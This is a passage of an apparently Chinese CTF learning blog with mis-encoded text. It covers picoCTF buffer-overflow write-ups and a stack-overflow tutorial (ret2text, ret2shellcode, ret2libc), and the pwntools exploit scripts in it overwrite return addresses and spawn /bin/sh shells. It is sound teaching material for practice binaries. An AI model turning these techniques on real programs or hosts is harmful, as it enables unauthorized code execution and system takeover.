62318)p.sendline(b&#x27;a&#x27;*20)p.interactive() buffer overflow 1é¢˜ç›®æè¿° æ§åˆ¶é€€è´§åœ°å€ç°åœ¨æˆ‘ä»¬å¼€å§‹çƒ¹é¥ªäº†ï¼æ‚¨å¯ä»¥æº¢å‡ºç¼“å†²åŒºå¹¶è¿”å›åˆ°ç¨‹åºä¸­çš„ flag å‡½æ•°ã€‚ä½ å¯ä»¥åœ¨è¿™é‡ŒæŸ¥çœ‹æºä»£ç ã€‚ è§£å¯† var_4 æ˜¯ä»€ä¹ˆï¼Ÿ åœ¨æ±‡ç¼–æˆ–åç¼–è¯‘å·¥å…·ï¼ˆå¦‚ IDA Proï¼‰ä¸­ï¼Œvar_4 æ˜¯ä¸€ä¸ªç”±å·¥å…·è‡ªåŠ¨ç”Ÿæˆçš„åç§°ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªä½äºæ ˆä¸Šçš„å±€éƒ¨å˜é‡ã€‚å®ƒé€šå¸¸æ˜¯åŸå§‹Cä»£ç ä¸­æ²¡æœ‰æ˜ç¡®å‘½åçš„å˜é‡ï¼Œæˆ–è€…æ˜¯ç¼–è¯‘å™¨ä¸ºäº†ä¼˜åŒ–æˆ–å†…éƒ¨ä½¿ç”¨è€Œåˆ›å»ºçš„æ ˆç©ºé—´ã€‚ ä»å›¾ç‰‡ä¸­å¯ä»¥çœ‹åˆ°ï¼Œvar_4 ä½äº s æ•°ç»„çš„ä¸‹æ–¹ï¼ˆåœ¨æ ˆå¸§ä¸­ï¼Œå±€éƒ¨å˜é‡é€šå¸¸ä» EBP å¾€ä¸‹åˆ†é…ï¼‰ã€‚ var_4 æœ‰å¤šå¤§ï¼Ÿ å›¾ç‰‡ä¸­ var_4 å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤æ˜¯ dd ?ã€‚ dd åœ¨æ±‡ç¼–ä¸­æ˜¯ â€œDefine Doublewordâ€ çš„ç¼©å†™ã€‚åœ¨ 32 ä½ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ª Doubleword æ˜¯ 4 å­—èŠ‚ã€‚ å› æ­¤ï¼Œvar_4 çš„å¤§å°æ˜¯ 4 å­—èŠ‚ã€‚ æ‰€ä»¥åƒåœ¾å­—èŠ‚è¦å¡«å……36+4+4&#x3D;44ä¸ªå­—èŠ‚ winæ˜¯åé—¨å‡½æ•° å¡«å……å®ƒçš„åœ°å€ è„šæœ¬1234from pwn import *p = remote(&quot;saturn.picoctf.net&quot;, 59895)p.sendline(b&#x27;a&#x27;*44+p32(0x080491F6))p.interactive() buffer overflow 2é¢˜ç›®æè¿° æ§åˆ¶è¿”å›åœ°å€å’Œå‚æ•°è¿™ä¸€æ¬¡ï¼Œæ‚¨éœ€è¦æ§åˆ¶æ‚¨è¿”å›çš„å‡½æ•°çš„å‚æ•°ï¼æ‚¨å¯ä»¥ä»æ­¤ç¨‹åºä¸­è·å–æ ‡å¿—å—ï¼Ÿä½ å¯ä»¥åœ¨è¿™é‡ŒæŸ¥çœ‹æºä»£ç  è§£å¯† sè·ç¦»è¿”å›åœ°å€æ˜¯6C+4ä¸ªå­—èŠ‚ è¦ä¼ å‚ï¼Œ32ä½æ˜¯å‚æ•°ä»å³åˆ°å·¦ä¾æ¬¡å‹å…¥æ ˆä¸­ winçš„åœ°å€ gdbåŠ¨è°ƒæŸ¥çœ‹python wp.py æ‰§è¡Œçš„å‡½æ•°åˆ—è¡¨ è„šæœ¬1234567891011from pwn import *# æœ¬åœ°# ex = process(&#x27;./vuln&#x27;)# è¿œç¨‹p = remote(&#x27;saturn.picoctf.net&#x27;, 62974)payload = b&#x27;a&#x27;*112+p32(0x08049296)+p32(0)+p32(0xCAFEF00D)+p32(0xF00DF00D)p.sendline(payload)# p.interprint(p.recvall()) x-sixty-whaté¢˜ç›®æè¿° æº¢å‡º x64 ä»£ç åœ¨æ­¤ä¹‹å‰çš„å¤§å¤šæ•°é—®é¢˜æ˜¯ 32 ä½ x86ã€‚ç°åœ¨æˆ‘ä»¬è€ƒè™‘ 64 ä½ x86ï¼Œå®ƒ åªæ˜¯æœ‰ç‚¹ä¸åŒï¼ä½¿ç¼“å†²åŒºæº¢å‡ºï¼Œå¹¶å°†è¿”å›åœ°å€æ›´æ”¹ä¸º flag å‡½æ•°ã€‚ ä¸‹è½½æºä»£ç  ã€‚ è§£å¯† è¿™ä¸€é¢˜æˆ‘é”™äº†å¾ˆä¹…ï¼Œæœ€åå‘ç°è€ƒäº†å †æ ˆå¹³è¡¡:crying_cat_face: ä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä¸€äº›gdbè°ƒè¯•è·å–ä¿¡æ¯çš„æ–¹æ³• gdbè°ƒè¯•è·å¾—ç›¸å…³ä¿¡æ¯ readelf -s vulnæ˜¾ç¤ºæ‰€æœ‰å‡½æ•°çš„ä¿¡æ¯ï¼ˆåœ¨gdbè°ƒè¯•ä¹‹å‰ï¼‰ p flagï¼šæ˜¾ç¤ºå‡½æ•°flagçš„ä¿¡æ¯ ï¼ˆgdbï¼‰disassemble vulnï¼šæ‰¾è¦å¡«å……çš„å­—èŠ‚æ•°ï¼ˆï¼‰ 64ä½æ—¶æ˜¯0x40+8 32ä½æ—¶æ˜¯0x40+4 å †æ ˆå¹³è¡¡åŒä¸€ä¸ªç¨‹åºçš„æ¯ä¸€ä¸ª call æŒ‡ä»¤æ‰§è¡Œæ—¶ï¼Œrspï¼ˆæ ˆæŒ‡é’ˆï¼‰çš„ç»å¯¹å€¼ä¸ä¸€å®šç›¸åŒï¼Œä½†å…¶å¯¹é½çŠ¶æ€æ˜¯ä¿æŒä¸€è‡´çš„ã€‚ å½“ vuln å‡½æ•°é€šè¿‡ ret æŒ‡ä»¤è·³è½¬åˆ° flag å‡½æ•°æ—¶ï¼Œflag å‡½æ•°çš„å…¥å£å¤„ rsp (æ ˆæŒ‡é’ˆ) å¯èƒ½æ»¡è¶³ rsp % 16 == 0 (å³ 16 å­—èŠ‚å¯¹é½)ã€‚ä½†æ˜¯ï¼Œflag å‡½æ•°çš„åºè¨€ (prologue) é€šå¸¸ä¼š push rbp (å°† rbp å‹æ ˆ)ï¼Œè¿™ä¼šä½¿ rsp å‡å» 8 å­—èŠ‚ï¼Œå¯¼è‡´ rsp % 16 == 8 (8 å­—èŠ‚ä¸å¯¹é½)ã€‚ é—®é¢˜å°±å‡ºåœ¨è¿™é‡Œï¼šåœ¨æ‰§è¡Œä»»ä½• call æŒ‡ä»¤ä¹‹å‰ï¼Œrsp å¿…é¡»æ˜¯ 16 å­—èŠ‚å¯¹é½çš„ã€‚ æ‰€ä»¥è¯¥å‡½æ•°åˆ°flagä¹‹å‰è¦å…ˆåˆ°retå°å·¥å…· ä½¿ç”¨ ROPgadget (æ¨è)ï¼š åœ¨ç»ˆç«¯ä¸­è¿è¡Œï¼ˆç¡®ä¿ä½ çš„ vuln å¯æ‰§è¡Œæ–‡ä»¶åœ¨å½“å‰ç›®å½•ï¼‰ï¼š Bash 1ROPgadget --binary ./vuln --only &quot;ret&quot; å®ƒä¼šåˆ—å‡ºæ‰€æœ‰ç‹¬ç«‹çš„ ret æŒ‡ä»¤åœ°å€ã€‚é€šå¸¸ä½ å¯ä»¥é€‰æ‹©å…¶ä¸­ä¸€ä¸ªåœ°å€æœ€å°çš„ï¼Œæˆ–è€…ä½ è§‰å¾—â€œç‹¬ç«‹â€çš„åœ°å€ï¼ˆä¾‹å¦‚ï¼Œä¸åœ¨ä»»ä½•é‡è¦å‡½æ•°çš„ä¸­é—´ï¼‰ã€‚0x0040101a æ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„å¤‡é€‰ã€‚ åœ¨ GDB&#x2F;pwndbg ä¸­æ‰‹åŠ¨æŸ¥æ‰¾ï¼š å¯åŠ¨ GDB è°ƒè¯• ./vulnï¼Œç„¶åä½¿ç”¨ search-pattern å‘½ä»¤æŸ¥æ‰¾ ret æŒ‡ä»¤çš„æœºå™¨ç  \\xc3ï¼š Code snippet 1search-pattern &#x27;\\xc3&#x27; ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ disassemble &lt;section_start_address&gt;, &lt;section_end_address&gt; æ¥åæ±‡ç¼–æ•´ä¸ªä»£ç æ®µï¼Œç„¶åæ‰‹åŠ¨æŸ¥æ‰¾ retã€‚ ç›´æ¥çœ‹å‡ºå †æ ˆä¸å¹³è¡¡ è¯¥å‡½æ•°æ˜¯flagè¢«è°ƒç”¨å‡½æ•°è¾“å‡ºflagï¼Œæ‰€ä»¥åœ¨flagå‡½æ•°ä¸­çš„ç¬¬ä¸€ä¸ªcallçš„åœ°æ–¹ä¸‹æ–­ç‚¹ python ä½ çš„è„šæœ¬æ–‡ä»¶å.pyï¼šè¿è¡Œè„šæœ¬ info registers rspï¼šæŸ¥çœ‹rspçš„å¯„å­˜å™¨ä¿¡æ¯ çœ‹æœ€åä¸¤ä½ 0x48å¯ä»¥æ•´é™¤16ï¼Œæ‰€ä»¥ç°åœ¨å †æ ˆå¹³è¡¡äº† è„šæœ¬12345678910111213141516171819from pwn import *# p = process(&#x27;./vuln&#x27;)# gdb.attach(p, gdbscript=&#x27;b *0x08049370\\ncontinue&#x27;)p = remote(&quot;saturn.picoctf.net&quot;, 50442)# ä¹‹å‰æ‰¾åˆ°çš„ flag å‡½æ•°åœ°å€flag_address = 0x00401236 # åœ¨ä½ çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°ä¸€ä¸ª ret å°å·¥å…·çš„åœ°å€# å‡è®¾ä½ æ‰¾åˆ°çš„æ˜¯ 0x0040101aï¼Œè¯·æ›¿æ¢ä¸ºä½ åœ¨ GDB/ROPgadget ä¸­æ‰¾åˆ°çš„å®é™…åœ°å€ret_gadget_address = 0x0040101a # æ„å»º payloadï¼šå¡«å…… + ret_gadget_address + flag_addresspayload = b&#x27;A&#x27; * (0x40 + 8) + p64(ret_gadget_address) + p64(flag_address)p.sendline(payload)print(p.recvall())","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"åˆè¯†æ ˆæº¢å‡º","slug":"åˆè¯†æ ˆæº¢å‡º","date":"2025-07-05T04:06:13.000Z","updated":"2025-07-18T12:29:41.121Z","comments":true,"path":"2025/07/05/åˆè¯†æ ˆæº¢å‡º/","permalink":"http://example.com/2025/07/05/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"fun(a,b)è°ƒç”¨è¿‡ç¨‹å…¥æ ˆ ï¼ˆ1ï¼‰å‹å…¥å‚æ•° æ ¹æ®è°ƒç”¨çº¦å®šï¼Œmainå‡½æ•°ä½œä¸ºè°ƒç”¨è€…ï¼Œé¦–å…ˆéœ€è¦å°†funcå‡½æ•°çš„ä¸¤ä¸ªå‚æ•°a,bå‹å…¥æ ˆä¸­ã€‚ æ³¨æ„å‹å…¥å‚æ•°çš„é¡ºåºï¼Œé¦–å…ˆå‹å…¥bï¼Œæ¥ç€å‹å…¥aï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå‹å…¥å‚æ•°çš„é¡ºåºæ˜¯ä»å³åˆ°å·¦ã€‚ ï¼ˆ2ï¼‰è¿”å›åœ°å€å‹æ ˆ è¿”å›åœ°å€å‹æ ˆã€‚mainå‡½æ•°ä¸ºäº†è®©funcå‡½æ•°è°ƒç”¨åæ­£å¸¸è¿”å›ï¼Œéœ€è¦å°†å½“å‰æŒ‡ä»¤ï¼ˆcallæŒ‡ä»¤ï¼‰çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å‹å…¥æ ˆä¸­ callæŒ‡ä»¤åŒ…å«ä¸¤ä¸ªæ­¥éª¤ï¼šmainå‡½æ•°çš„ä¸‹ä¸€æ¡æŒ‡ä»¤å‹æ ˆï¼›æ§åˆ¶eipä¸ºfuncå‡½æ•°çš„ç¬¬ä¸€æ¡è¯­å¥ï¼Œeipå­˜å‚¨ç€CPUå°†è¦æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€ ï¼ˆ3ï¼‰funcå‡½æ•°è¿è¡Œ funcå‡½æ•°éœ€è¦è‡ªå·±çš„å†…éƒ¨è¿ä½œç©ºé—´ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤åºåˆ—å¼€è¾Ÿç©ºé—´ï¼špush ebp mov ebp,esp sub esp,28h è¿™ä¸ª28hå°±æ˜¯å¼€è¾Ÿçš„å­˜å‚¨funcå‡½æ•°çš„ç›¸å…³å†…å­˜çš„ç©ºé—´ mov ebp,espçœ‹ä¼¼æ²¡æœ‰å˜åŒ–ï¼Œä½†EBP ä»â€œä¿å­˜è°ƒç”¨è€…åŸºå€â€å˜ä¸ºâ€œå½“å‰å‡½æ•°çš„æ ˆå¸§åŸºå€â€ã€‚ ï¼ˆ4ï¼‰funcå‡½æ•°çš„å±€éƒ¨å˜é‡å’Œå‚æ•° funcå‡½æ•°æœ‰è‡ªå·±å†…éƒ¨çš„è¿ä½œç©ºé—´ï¼Œå³func_ebpåˆ°func_esp å±€éƒ¨å˜é‡åœ¨ç¼–è¯‘ä¹‹åä¼šè¢«è¡¨ç¤ºä¸ºä¸ebp ä¸åŒçš„è·ç¦» v2è¢«è¡¨ç¤ºä¸ºebp -18hï¼Œv3è¢«è¡¨ç¤ºä¸ºebp -10hã€‚ æ³¨æ„ï¼Œè¿™é‡Œçš„v2, v3å’Œv4éƒ½æ˜¯å±€éƒ¨å˜é‡ã€‚å‚æ•°çš„è¯»å–æ–¹å¼ä¾‹å­:ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ebp+8ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ebp+12 å› ä¸ºè°ƒç”¨çº¦å®šï¼Œè‚¯å®šæœ‰main_nextå’Œmain_ebpåœ¨ebpçš„ä¸Šæ–¹ï¼Œæ•…åç§»æ˜¯å›ºå®šçš„ï¼Œåœ¨è¿”å›åœ°å€main_nextä¸Šé¢ ç„¶åï¼Œfuncå‡½æ•°è¿”å›ã€‚ä¸¤ä¸ªæ­¥éª¤ï¼šæ¸…é™¤æ ˆç©ºé—´ï¼Œè¿”å›åˆ°ä¹‹å‰æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆmain_nextï¼‰å¤„ã€‚ (5)funcå‡½æ•°è¿”å›æ­¥éª¤1:æ¸…é™¤æ ˆç©ºé—´ æ¯ä¸ªå‡½æ•°æ¸…é™¤æ ˆç©ºé—´æ—¶å¯ä»¥ä½¿ç”¨ä¸€æ¡å…¬ç”¨æŒ‡ä»¤leaveã€‚ leaveåŒ…å«ä¸¤ä¸ªæ­¥éª¤ï¼š â‘ mov esp,ebpå°†æ ˆé¡¶è®¾ç½®ä¸ºæ ˆåŸºï¼Œå³å°†func_ebpåˆ°func_espçš„å†…å®¹å…¨éƒ¨å‡ºæ ˆï¼› â‘¡pop ebp å°†main_ebpçš„å†…å®¹é‡æ–°å¼¹å›ebpï¼Œä½¿mainå‡½æ•°çš„æ ˆåŸºå€å¾—åˆ°æ¢å¤ (6)funcå‡½æ•°è¿”å›æ­¥éª¤2ï¼šè¿”å›ä¹‹å‰æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆmain_nextï¼‰å¤„ æ¯ä¸ªå‡½æ•°è¿”å›æ—¶å¯ä»¥ä½¿ç”¨ä¸€æ¡å…¬ç”¨æŒ‡ä»¤retã€‚retåŒ…å«ä¸€ä¸ªæ­¥éª¤ï¼šå°†æ ˆé¡¶å¼¹å‡ºåˆ°eipå¯„å­˜å™¨ï¼ˆå³ä¸‹ä¸€æ¡æŒ‡ä»¤çš„ä½ç½®ï¼‰ï¼Œè¾¾åˆ°æ¢å¤mainå‡½æ•°æ‰§è¡Œé¡ºåºçš„ ç›®çš„ã€‚ åˆ°è¿™é‡Œï¼Œmainå‡½æ•°çš„æ ˆåŸºå€å’Œä¸‹ä¸€æ¡æŒ‡ä»¤éƒ½å¾—åˆ°äº†æ¢å¤ï¼Œä¹Ÿå°±å®Œæˆäº†æ•´ä¸ªfuncå‡½æ•°çš„è°ƒç”¨ã€‚ Linuxæ“ä½œç³»ç»Ÿçš„ä¿æŠ¤ Arch:amd64-64-littleï¼š amd64å³x86_64(CPUæ¶æ„) 64å³å­—é•¿ä¸º64ï¼Œè¿”å›åœ°å€åœ¨æ ˆä¸­å  8å­—èŠ‚ï¼Œ32ä½æ˜¯4å­—èŠ‚ï¼‰ littleè¡¨ç¤ºå°ç«¯åºï¼Œå¦‚æœæ˜¯bigåˆ™è¡¨ç¤ºå¤§ç«¯åºã€‚ä»¥æ•°å­—0x12345678ä¸ºä¾‹ï¼Œå°ç«¯åºå­˜å‚¨çš„æ˜¯\\x78\\x56\\x34\\x12ï¼Œå¤§ç«¯åºå­˜å‚¨çš„æ˜¯\\x12\\x34\\x56\\x78 RELROï¼šPartial RELRO: Partial RELROå’ŒFull RELROçš„åŒºåˆ«å¯ä»¥ç®€å•ç†è§£ä¸ºGOTå†™æƒé™çš„åŒºåˆ«ï¼ŒPartial RELROç›¸å½“äºGOTå¯å†™ï¼ŒFull RELROç›¸å½“äºGOTä¸å¯å†™ã€‚ NXï¼šNX enabled: å¦‚æœå¼€å¯äº†NXä¿æŠ¤æœºåˆ¶ï¼Œé‚£ä¹ˆwæƒé™å’Œxæƒé™å°±æ˜¯äº’æ–¥çš„,å³ä¸å­˜åœ¨æ—¢æ‹¥æœ‰å†™æƒé™åˆæ‹¥æœ‰æ‰§è¡Œæƒé™çš„æ®µã€‚è¿™ä¸ªä¿æŠ¤æœºåˆ¶æ˜¯ç”¨æ¥é˜²æ­¢shellcodeæ¤å…¥çš„ã€‚åœ¨gdbè°ƒè¯•ä¸­ï¼Œå¯ä»¥é€šè¿‡vmmapå‘½ä»¤æ¥æŸ¥çœ‹æ¯ä¸ªæ®µçš„æƒé™ã€‚ PIEï¼šNo PIEï¼ˆ0x8048000ï¼‰ ret2text(è¦†ç›–è¿”å›åœ°å€)è¯¥å‡½æ•°å†…å­˜åœ¨getæ¼æ´ è¯¥å‡½æ•°æ³„éœ²äº†åé—¨å‡½æ•° æ¥ç€é€šè¿‡getså‡½æ•°æ ˆæº¢å‡ºå°†è¿™ä¸ªåœ°å€æ”¹ä¸ºtargetï¼Œé‚£ä¹ˆvulnfuncè¿”å›çš„æ—¶å€™ï¼Œç”¨retæŒ‡ä»¤å–å‡ºæ ˆé¡¶çš„å…ƒç´ è¿”å›ï¼Œå°±ä¼šè¿”å›åˆ°targetè¿™ä¸ªå‡½æ•° targetå‡½æ•°ä¸­æœ‰systemï¼ˆâ€&#x2F;bin&#x2F;shâ€ï¼‰è¿™ä¸ªåé—¨ï¼Œç±»ä¼¼äºåœ¨Linuxçš„ç»ˆç«¯ç›´æ¥è°ƒç”¨&#x2F;bin&#x2F;shã€‚åˆ©ç”¨è¿™ç§æ–¹å¼å¯ä»¥ç›´æ¥è¿”å›ä¸€ä¸ªshellï¼Œè¿›è€Œå¾—åˆ°ç›®æ ‡ä¸»æœºçš„shellï¼Œæ‹¿åˆ°æ§åˆ¶æƒã€‚ æ‰¾å¡«å……å­—èŠ‚ ç›´æ¥ä»IDAä¸­è¯»å‡ºé•¿åº¦ såˆ°vulnfuncçš„ebpçš„è·ç¦»æ˜¯108hï¼Œæ‰€ä»¥åˆ°main_nextçš„è·ç¦»æ˜¯0x108+4 é‚£ä¸ª4æ˜¯32ä½çš„ebpçš„ç©ºé—´ è„šæœ¬1234567from pwn import *p = process(&quot;./ret2text&quot;)p.recvuntil(&quot;ret2text\\n&quot;)payload = b&#x27;a&#x27;* (0x108+4) + p32(0x0804850B)p.sendline(payload)p.interactive() ret2shellcodeï¼ˆè¦†ç›–è¿”å›åœ°å€åˆ°Shellcodeï¼‰Shellcodeæ˜¯æœºå™¨ç æ ¼å¼çš„æ¶æ„ä»£ç ï¼ŒæŒ‡çš„æ˜¯ç”¨äºå®ŒæˆæŸä¸ªåŠŸèƒ½çš„æ±‡ç¼–ä»£ç ï¼Œå¸¸ç”¨çš„åŠŸèƒ½æ˜¯è·å–ç›®æ ‡ç³»ç»Ÿçš„shellã€‚åœ¨æ ˆæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬ä¸€èˆ¬éƒ½æ˜¯å‘æ ˆä¸­å†™å†…å®¹ï¼Œæ‰€ä»¥è¦æƒ³æ‰§è¡ŒShellcodeï¼Œå°±è¦æ±‚å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰å¼€å¯NXä¿æŠ¤ printf(&quot;%p\\n&quot;, s)è¾“å‡ºäº†Sçš„ç¼“å†²åŒºçš„ä½ç½® æ²¡æœ‰å¼€å¯NXä¿æŠ¤ æ‰€ä»¥å¯ä»¥å‘è¿›ç¨‹ä¸­å†™å…¥ä¸€æ®µShellcodeï¼ˆåˆ©ç”¨wå†™æƒé™ï¼‰ï¼Œå†æ‰§è¡Œè¿™æ®µShellcodeï¼ˆåˆ©ç”¨xæ‰§è¡Œæƒé™ï¼‰ã€‚ è„šæœ¬1234567891011from pwn import *context.arch = &quot;i386&quot;p = process(&quot;./ret2shellcode&quot;)#gdb.attach(p,&quot;b *0x08048593&quot;)p.recvuntil(b&quot;ret2shellcode\\n&quot;) # ä¿®æ”¹ä¸ºå­—èŠ‚ä¸²target = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) # ä¿®æ”¹ä¸ºå­—èŠ‚ä¸²sc = asm(shellcraft.sh())payload = sc+b&#x27;a&#x27; * (0x108 + 4-len(sc))+ p32(target) p.sendline(payload)p.interactive() context.arch = &quot;i386&quot;è¯´æ˜ç¨‹åºçš„æ¶æ„ï¼Œä½¿ç”¨ asm() å‡½æ•°å°† shellcode (shellcraft.sh()) æ±‡ç¼–æˆæœºå™¨ç æ—¶ï¼Œpwntools éœ€è¦çŸ¥é“ç›®æ ‡æ¶æ„æ˜¯ 32 ä½è¿˜æ˜¯ 64 ä½ï¼Œä»¥ä¾¿ç”Ÿæˆæ­£ç¡®çš„æŒ‡ä»¤é›†ã€‚32 ä½å’Œ 64 ä½çš„æŒ‡ä»¤æ˜¯ä¸åŒçš„ã€‚ target = int(p.recvuntil(b&quot;\\n&quot;,drop = True),16) æ¥æ”¶çŸ¥é“è¯»å–åˆ°&#x2F;nï¼Œ(è¾“å‡ºçš„ç¼“å†²åŒºçš„åœ°å€)ï¼Œè½¬åŒ–ä¸ºåå…­è¿›åˆ¶æ•´æ•°ï¼Œä¸”drop = Trueæ–¹ä¾¿åœ°æ¸…ç†ä½ æ¥æ”¶åˆ°çš„æ•°æ®ã€‚åªæå–æŸä¸ªæ¨¡å¼ï¼ˆæ¯”å¦‚ä¸€ä¸ªåœ°å€ã€ä¸€ä¸ªæ•°å­—æˆ–ä¸€ä¸ªç‰¹å®šçš„å­—ç¬¦ä¸²ï¼‰è€Œä¸åŒ…å«ç”¨äºåˆ†éš”æˆ–ç»ˆæ­¢çš„å­—ç¬¦ï¼ˆå¦‚æ¢è¡Œç¬¦ã€ç©ºæ ¼ã€å†’å·ç­‰ï¼‰ sc = asm(shellcraft.sh())ç”Ÿæˆå¯åŠ¨/bin/shçš„æœºå™¨ç  payload = sc+b&#39;a&#39; * (0x108 + 4-len(sc))+ p32(target) ä»å³åˆ°å·¦å…¥æ ˆï¼Œp32(target):è¦†ç›–è¿”å›åœ°å€ï¼Œbâ€™aâ€™ * (0x108 + 4 - len(sc)):å¡«å……ä»scç»“æŸä½ç½®åˆ°è¿”å›åœ°å€ä¹‹é—´æ‰€æœ‰â€œæ— ç”¨â€çš„æ ˆç©ºé—´ã€‚sc:å½“ scä½äºç¼“å†²åŒºçš„èµ·å§‹ä½ç½®ã€‚ ropNX ä¿æŠ¤ (No-Execute): å®ƒçš„å”¯ä¸€ç›®çš„æ˜¯é˜»æ­¢ä½ åœ¨æ•°æ®åŒºåŸŸï¼ˆæ¯”å¦‚æ ˆå’Œå †ï¼‰æ‰§è¡Œä»£ç ã€‚ä½ å¯ä»¥æŠŠæ ˆå’Œå †æƒ³è±¡æˆä¸€å—â€œåªå†™æ•°æ®ï¼Œä¸èƒ½è·‘ç¨‹åºâ€çš„åŒºåŸŸã€‚ å…è®¸ä»€ä¹ˆï¼Ÿ å…è®¸ä½ åœ¨æ ˆä¸Šå†™æ•°æ®ï¼ˆæ¯”å¦‚å¡«å……å­—ç¬¦ä¸² AAAAï¼Œæˆ–è€…ä¸€äº›åœ°å€ï¼‰ã€‚ å…è®¸ä½ ä¿®æ”¹å¯„å­˜å™¨çš„å€¼ã€‚ å…è®¸ä½ è¦†ç›–è¿”å›åœ°å€ã€‚ é˜»æ­¢ä»€ä¹ˆï¼Ÿ é˜»æ­¢ä½ æŠŠè‡ªå·±çš„æ±‡ç¼–ä»£ç ï¼ˆæˆ‘ä»¬ç§°ä¹‹ä¸º Shellcodeï¼‰æ”¾åœ¨æ ˆä¸Šï¼Œç„¶åè®©ç¨‹åºå»æ‰§è¡Œå®ƒã€‚ ret2libc1ï¼ˆå•ä¸ªå‡½æ•°çš„ropæ¥é“¾ï¼‰ç¬¬ä¸€æ­¥ï¼Œå…ˆçœ‹ä¿æŠ¤ getæº¢å‡º systemå‡½æ•°å­˜åœ¨,ä½†å‚æ•°ä¸æ˜¯&#x2F;bin&#x2F;sh systemå‡½æ•°å­˜åœ¨,å¹¶ä¸”ç¨‹åºä¸­å¿ƒå­˜åœ¨bin&#x2F;shå­—ç¬¦ä¸² æ‰€ä»¥å¯ä»¥æŠŠbin&#x2F;shä½œä¸ºå‚æ•°ä¼ å…¥systemå‡½æ•°ä¸­æ„é€ åé—¨å‡½æ•° è¦æ„é€ ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œå…ˆè°ƒç”¨systemå‡½æ•°ï¼Œç„¶åæŒ‰ç…§è°ƒç”¨æµç¨‹ï¼Œå‚æ•°ï¼ˆbin&#x2F;shå­—ç¬¦ä¸²æ‰€åœ¨çš„ä½ç½®ï¼‰å…¥æ ˆï¼Œè¿”å›åœ°å€å…¥æ ˆ payloadçš„å½¢å¼æ˜¯**[åƒåœ¾å¡«å……] + [systemå‡½æ•°åœ°å€] + [systemè¿”å›åœ°å€] + [binshå­—ç¬¦ä¸²åœ°å€]** è„šæœ¬12345678910111213from pwn import *context.arch = &quot;i386&quot; # å¼ºçƒˆå»ºè®®åŠ ä¸Šè¿™ä¸€è¡Œp = process(&quot;./ret2libc1&quot;)#gdb.attach(p,&quot;b *0x08048595&quot;) # è°ƒè¯•æ—¶å¯ç”¨#elf = ELF(&quot;./ret2libc1&quot;)#system = elf.plt[&quot;system&quot;]binsh = 0x0804A028 # ç¡®ä¿è¿™ä¸ªåœ°å€ç¡®å®åŒ…å« &quot;/bin/sh&quot; å­—ç¬¦ä¸²p.recvuntil(b&quot;ret2libc1\\n&quot;) payload = b&#x27;a&#x27; * (0x108 + 4)+ p32(0x080483D0)+p32(0)+p32(0x804A028)p.sendline(payload)p.interactive() æ‰¾åˆ°systemå‡½æ•°ä½ç½® elf = ELF(&quot;./ret2libc1&quot;) system = elf.plt[&quot;system&quot;]ç›´æ¥æ‰¾åˆ°systemdçš„å…¥å£ æ³¨æ„ [systemè¿”å›åœ°å€] ä¸èƒ½ä¹±å†™ï¼Œåé—¨å‡½æ•°æ‰§è¡Œç»“æŸåä¼šè¿”å›è¿™ä¸ªåœ°å€ï¼Œé”™è¯¯çš„åœ°å€ä¼šå¼•å‘å´©æºƒ 1.elf.plt[&quot;exit&quot;] (æœ€å¸¸ç”¨ï¼Œæ¨è)ï¼š ä½œç”¨ï¼šè®© system(&quot;/bin/sh&quot;) æ‰§è¡Œå®Œæ¯•åï¼Œç¨‹åºèƒ½å¤Ÿå¹²å‡€åœ°è°ƒç”¨ exit() å‡½æ•°å¹¶é€€å‡ºã€‚è¿™æ˜¯æœ€æ¨èçš„åšæ³•ï¼Œå› ä¸ºå®ƒç¡®ä¿äº†ç¨‹åºçš„æ­£å¸¸ç»ˆæ­¢ã€‚ ä¼˜ç‚¹ï¼šç¨³å®šã€å¯é ï¼Œä¸ä¼šå¯¼è‡´å´©æºƒã€‚ è·å–æ–¹å¼ï¼šelf.plt[&quot;exit&quot;] (pwntools ä¼šè‡ªåŠ¨è§£æ)ã€‚ 2.0x0 æˆ–å…¶ä»–æ— æ•ˆåœ°å€ (å¯¼è‡´å´©æºƒ)ï¼š ä½œç”¨ï¼šå¦‚æœä½ åªå…³å¿ƒ system(&quot;/bin/sh&quot;) æ˜¯å¦è¢«æ‰§è¡Œï¼Œè€Œä¸å…³å¿ƒç¨‹åºæ˜¯å¦å´©æºƒï¼Œé‚£ä¹ˆå¯ä»¥éšä¾¿å¡«ã€‚ ä¼˜ç‚¹ï¼šæœ€ç®€å•ã€‚ ç¼ºç‚¹ï¼šç¨‹åºä¼šå´©æºƒï¼Œè¿™åœ¨å®é™…æ”»é˜²ä¸­é€šå¸¸æ˜¯ä¸å¸Œæœ›çœ‹åˆ°çš„ã€‚æœ‰æ—¶è°ƒè¯•æ—¶ä¸ºäº†å¿«é€ŸéªŒè¯ system æ˜¯å¦è¢«è°ƒç”¨ï¼Œå¯èƒ½ä¼šæš‚æ—¶ä½¿ç”¨ã€‚ ret2libc2(ä¸¤ä¸ªå‡½æ•°çš„ropé“¾) è¯¥é¢˜æ²¡æœ‰bin&#x2F;shå­—ç¬¦ä¸² æ‰€ä»¥æˆ‘ä»¬è¦è‡ªå·±å»é€šè¿‡getæ„é€  (1)funcå‡½æ•°é€šè¿‡æ ˆæº¢å‡ºä¿®æ”¹è¿”å›åœ°å€ä¸ºgets_addr,ä¼ 